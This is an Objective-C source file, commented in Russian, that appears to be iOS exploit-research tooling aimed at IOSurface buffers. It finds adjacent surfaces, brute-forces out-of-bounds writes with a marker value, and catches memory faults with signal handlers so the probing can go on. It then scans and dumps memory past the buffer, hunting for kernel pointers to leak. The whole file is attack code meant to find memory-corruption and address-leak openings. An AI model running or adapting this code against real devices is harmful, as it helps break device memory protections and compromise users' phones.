#import <IOSurface/IOSurfaceRef.h>
#import <setjmp.h>
#import <signal.h>

// ============================================================
// Mode 127: CPU OOB & Kernel Scan (Порт Python-скриптов)
// ============================================================

static sigjmp_buf g_isurf_jmp;
static volatile int g_isurf_crashed = 0;

static void isurf_handler(int sig, siginfo_t *si, void *uc) {
    g_isurf_crashed = 1;
    siglongjmp(g_isurf_jmp, 1);
}

int nj_entry_ios_surface_oob(void) {
    F1LOG(@"[ISURF] === CPU OOB & Kernel Scan Test ===");

    // 1. Создаем 50 IOSurface
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241 // BGRA
    };

    IOSurfaceRef surfaces[50];
    uintptr_t bases[50];
    int count = 0;

    F1LOG(@"[ISURF] Создаем 50 IOSurface (16 KB)...");
    for (int i = 0; i < 50; i++) {
        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (surf) {
            surfaces[count] = surf;
            bases[count] = (uintptr_t)IOSurfaceGetBaseAddress(surf);
            count++;
        }
    }
    F1LOG(@"[ISURF] Создано %d поверхностей.", count);

    // 2. Ищем соседей (delta == 0x4000)
    int target_idx = -1;
    for (int i = 0; i < count - 1; i++) {
        if (bases[i] && bases[i+1]) {
            uintptr_t delta = bases[i+1] - bases[i];
            if (delta == 0x4000) {
                F1LOG(@"[ISURF] Найдены соседи: idx %d (0x%llx) и %d (0x%llx)", 
                      i, (unsigned long long)bases[i], i+1, (unsigned long long)bases[i+1]);
                target_idx = i;
                break;
            }
        }
    }

    if (target_idx == -1) {
        F1LOG(@"[ISURF] Соседние буферы не найдены (delta != 0x4000).");
        for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
        return 0;
    }

    uintptr_t base1 = bases[target_idx];
    uintptr_t base2 = bases[target_idx+1];

    // Устанавливаем обработчик сигналов для безопасного перебора
    struct sigaction sa, old_segv, old_bus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = isurf_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);

    // ============================================================
    // 3. ЧАСТЬ 1: OOB Write (перебор смещений от 0x4000 до 0x8000)
    // ============================================================
    F1LOG(@"[ISURF] Часть 1: Перебор OOB Write (от 0x4000 до 0x8000)...");
    int found_oob = 0;
    
    for (uint64_t offset = 0x4000; offset < 0x8000; offset += 4) {
        g_isurf_crashed = 0;
        uintptr_t oob_addr = base1 + offset;

        // Безопасная запись (если попадем в Guard Page, isurf_handler сделает longjmp)
        if (sigsetjmp(g_isurf_jmp, 1) == 0) {
            *(uint32_t *)oob_addr = 0x41414141;
        } else {
            // Попали в защитную страницу
            continue; 
        }

        // Если запись прошла, проверяем surf2
        uint32_t val = *(uint32_t *)base2;
        if (val == 0x41414141) {
            F1LOG(@"[ISURF] ★★★ НАШЛИ! Смещение 0x%llx попадает в surf2! ★★★", (unsigned long long)offset);
            found_oob = 1;
            break;
        }
    }

    if (!found_oob) {
        F1LOG(@"[ISURF] OOB Write не удался. Между буферами Guard Pages.");
    }

    // ============================================================
    // 4. ЧАСТЬ 2: Поиск Kernel Pointers за границей surf2
    // ============================================================
    F1LOG(@"[ISURF] Часть 2: Сканирование памяти за surf2...");
    uintptr_t scan_start = base2 + 0x4000;
    int found_ptrs = 0;

    // Сканируем 200 страниц (3.2 MB)
    for (uint64_t i = 0; i < (0x4000 * 200); i += 8) {
        g_isurf_crashed = 0;
        uint64_t ptr = 0;
        uintptr_t read_addr = scan_start + i;

        if (sigsetjmp(g_isurf_jmp, 1) == 0) {
            ptr = *(uint64_t *)read_addr;
        } else {
            F1LOG(@"[ISURF] Сканирование прервано на смещении 0x%llx (Guard Page / SIGBUS)", (unsigned long long)i);
            break; // Чтение упало, дальше памяти нет
        }

        // Проверяем на kernel pointer (0xFFFF...)
        if ((ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
            F1LOG(@"[ISURF] ★ Найден potential kernel ptr на +0x%llx: 0x%016llx", (unsigned long long)i, (unsigned long long)ptr);
            found_ptrs++;
            if (found_ptrs >= 10) break;
        }
    }

    if (found_ptrs == 0) {
        F1LOG(@"[ISURF] Kernel pointers не найдены.");
    }

    // Восстанавливаем старые обработчики
    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);

    for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
    F1LOG(@"[ISURF] === Тест завершен ===");
    return 0;
}

int nj_entry_ios_surface_dump(void) {
    F1LOG(@"[ISURF-DUMP] === Dump Non-Zero Memory ===");

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241
    };
    IOSurfaceRef s1 = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    IOSurfaceRef s2 = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    uintptr_t b1 = (uintptr_t)IOSurfaceGetBaseAddress(s1);
    uintptr_t b2 = (uintptr_t)IOSurfaceGetBaseAddress(s2);

    if (b2 - b1 != 0x4000) {
        F1LOG(@"[-] Буферы не соседние (delta=0x%llx). Попробуй еще раз.", b2 - b1);
        CFRelease(s1); CFRelease(s2);
        return 0;
    }

    F1LOG(@"[ISURF-DUMP] s1=0x%llx, s2=0x%llx", b1, b2);
    F1LOG(@"[ISURF-DUMP] Сканируем 64 КБ от s2...");

    struct sigaction sa, old_segv, old_bus;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = isurf_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);

    // Сканируем от b2 до b2 + 0x10000 (64 КБ), шаг 8 байт
    uintptr_t dump_start = b2;
    uintptr_t dump_end = b2 + 0x10000;

    for (uintptr_t addr = dump_start; addr < dump_end; addr += 8) {
        uint64_t val = 0;
        
        if (sigsetjmp(g_isurf_jmp, 1) == 0) {
            val = *(uint64_t *)addr;
            // Выводим ТОЛЬКО ненулевые слова, чтобы не засорять лог
            if (val != 0) {
                F1LOG(@"[+0x%04llx] 0x%016llx", (unsigned long long)(addr - b2), (unsigned long long)val);
            }
        } else {
            F1LOG(@"[-] Ошибка чтения (Guard Page) на +0x%llx", (unsigned long long)(addr - b2));
            break;
        }
    }

    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);
    
    CFRelease(s1); CFRelease(s2);
    F1LOG(@"[ISURF-DUMP] === Конец дампа ===");
    return 0;
}
